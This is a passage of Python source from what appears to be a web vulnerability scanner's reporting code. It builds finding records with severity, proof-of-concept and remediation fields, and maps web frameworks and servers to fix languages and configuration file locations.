            fix_snippet  = "Remove " + path + " from the web server document root or block access in server config."
            fix_language = "text"
            fix_context  = "Web server configuration"

        return {
            "finding_type":   vuln_type,
            "severity": (
                "Low" if is_access_controlled else
                ("High" if evidence_captured else "High (unconfirmed)")
            ),
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "evidence_captured": evidence_captured,
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": 5 if is_access_controlled else _EFFORT_MINUTES["Sensitive File Exposed"],
        }

    def _action_generic(self, vuln_type: str, severity: str,
                         location: str,
                         evidence: Optional[Dict] = None) -> Optional[Dict]:
        evidence = evidence or {}
        evidence_block = self._evidence_block(
            evidence, "this finding type has no dedicated PoC generator"
        )
        return {
            "finding_type":   vuln_type,
            "severity":       severity,
            "location":       location,
            "attack_poc":     f"{evidence_block}\n# Location: {location}",
            "poc_type":       "none",
            "evidence_captured": bool(evidence),
            "fix_snippet":    "# Consult the remediation section for fix guidance.",
            "fix_language":   "text",
            "fix_context":    "Application code",
            "effort_minutes": _EFFORT_MINUTES["default"],
        }

    def _fix_language(self, stack_key: str) -> str:
        return {
            "sveltekit": "javascript",
            "next.js":   "javascript",
            "express":   "javascript",
            "django":    "python",
            "fastapi":   "python",
            "nginx":     "nginx",
            "apache":    "apache",
            "generic":   "text",
        }.get(stack_key, "text")

    def _fix_context(self, stack_key: str, header: str) -> str:
        return {
            "sveltekit": "hooks.server.js or svelte.config.js",
            "next.js":   "next.config.js",
            "express":   "app.js / server entry point",
            "django":    "settings.py",
            "fastapi":   "main.py / middleware",
            "nginx":     "nginx.conf server block",
            "apache":    "httpd.conf or .htaccess",
            "generic":   "Web server / application configuration",
        }.get(stack_key, "Application configuration")